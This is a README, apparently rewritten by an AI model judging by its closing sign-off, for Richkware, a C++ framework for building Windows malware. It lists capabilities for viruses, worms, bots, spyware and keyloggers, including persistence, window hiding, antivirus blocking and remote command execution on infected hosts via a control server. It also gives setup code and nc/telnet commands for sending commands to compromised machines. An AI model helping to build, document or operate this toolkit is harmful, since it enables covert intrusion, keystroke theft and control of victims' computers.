# Richkware

[![Build status](https://ci.appveyor.com/api/projects/status/1tn6vedeaq0v27ra?svg=true)](https://ci.appveyor.com/project/richkmeli/richkware)
[![Codacy Badge](https://api.codacy.com/project/badge/Grade/e6b4a003d5e7404c80225391bfe34f45)](https://app.codacy.com/app/richkmeli/Richkware?utm_source=github.com&utm_medium=referral&utm_content=richkmeli/Richkware&utm_campaign=Badge_Grade_Dashboard)

Richkware is a framework for building Windows malware, written in C++. It provides a library of network and system functions for creating different types of malware, including viruses, worms, bots, spyware, keyloggers, and scareware.

## Description

The Richkware framework includes a set of modules and functions that enable you to create malware with various capabilities. These include network communication, system manipulation, cryptography, and more.

### Types of Malware Supported:
- Virus
- Worms
- Bot
- Spyware
- Keylogger
- Scareware

## Related Projects

- **[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)**: A server for managing hosts infected with malware developed using the **Richkware** framework.
- **[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)**: A client for communicating with the **Richkware-Manager-Server**, which allows you to send commands to infected hosts.

![Diagram](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareDiagram1.2.png)

## Documentation

|              | EN                          | IT                     |
|--------------|:----------------------------:|:----------------------:|
| Presentation | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/EN/Slide.pdf) | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/IT/Slide.pdf) |
| Report       | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/EN/Report.pdf)  | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/IT/Relazione.pdf) |

## Functions

### Network

- **Server** (*network.h*): Manages a multi-thread server to receive commands from the internet (via **Richkware-Manager-Client** or console) according to a specific protocol.
    - **Protocol** (*protocol.h*):
        1. **Remote command execution** (ID 1)
        2. (work in progress)
- **Network** (*network.h*):
    - **RawRequest**: Send a request to a server.
    - **UploadInfoToRichkwareManagerServer**: Upload information to **Richkware-Manager-Server**.

### System

- **Storage** (*storage.h*):
    - **SaveSession** and **LoadSession**: Save and load the application state (encrypted), using:
        - **Register** (SaveValueReg and LoadValueReg)
        - **File** (SaveValueToFile and LoadValueFromFile)
    - **Persistence**: Ensures the application remains active in the system.
- **IsAdmin** and **RequestAdminPrivileges** (*richkware.h*): Check and request administrator privileges.
- **StealthWindow** (*richkware.h*): Hide application windows.
- **OpenApp** (*richkware.h*): Open arbitrary applications.
- **Keylogger** (*richkware.h*): Logs all keystrokes to a file.
- **BlockApps** and **UnBlockApps** (*blockApps.h*): Block and unblock applications (e.g., antivirus programs).

### Cryptography

- **Encrypt and Decrypt** (*crypto.h*): Uses **RC4** (default) or **Blowfish** encryption algorithms.
- **Encode and Decode** (*crypto.h*): Supports **Base64** (default) and **Hex** encoding.

![Cryptography Diagram](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareCryptographyDiagram1.1.png)

### Other Functions

- **RandMouse** (*richkware.h*): Randomly moves the mouse cursor.
- **Hibernation** (*richkware.h*): Hibernates the system.

## Requirements

To build and use **Richkware**, you will need:

- **Make** or **CMake**
- [MinGW](http://www.mingw.org/)

## Getting Started

### With **Richkware-Manager-Server** (RMS)

If you have deployed **RMS**, initialize the malware as follows:

```cpp
int main() {
    Richkware richkware("Richk", "DefaultPassword", "192.168.99.100", "8080", "associatedUser");
    ...
    return 0;
}
```

This will retrieve a secure key from **RMS** and use it for encryption. **DefaultPassword** is used as a fallback encryption key if the malware cannot reach the RMS.

### Without **Richkware-Manager-Server**

If you have not deployed **RMS**, you can use:

```cpp
Richkware richkware("Richk", "richktest");
```

This will use **richktest** as the encryption key.

## Compile

### Using MinGW (for Windows or cross-compiling for Linux)

```bash
make
```

### Using Microsoft C++ Compiler (Visual Studio)

- Go to **C/C++ > Preprocessor > Preprocessor Definitions**, and add `_CRT_SECURE_NO_WARNINGS`.
- In **Linker > Input > Additional Dependencies**, add `Ws2_32.lib`.

## Example Usage

### Server-side: Starting the Server

In your main program, call the **StartServer** function to start the server. The following example uses TCP port 8000:

```cpp
int main () {
    ...
    richkware.network.server.Start("8000");
    ...
}
```

### Client-side: Connecting to the Server

#### Using **Richkware-Manager-Client**:

If you are using **Richkware-Manager-Client**, you can connect to the server and send commands.

#### Using Terminal on Unix Systems:

On Unix-based systems, use **netcat** (`nc`):

```bash
nc <serverName> 8000
```

If the server is running and accessible, it will respond, and you can send commands like:

```plaintext
[[1]]COMMAND
```

#### Using Terminal on Windows:

On Windows, use **telnet**:

```bash
telnet <serverName> 8000
```

Once connected, send a command like:

```plaintext
[[1]]COMMAND
```

---

This updated README improves the clarity and structure of the original document, making it easier to follow and understand. If you have any further requests or changes you'd like to make, feel free to let me know!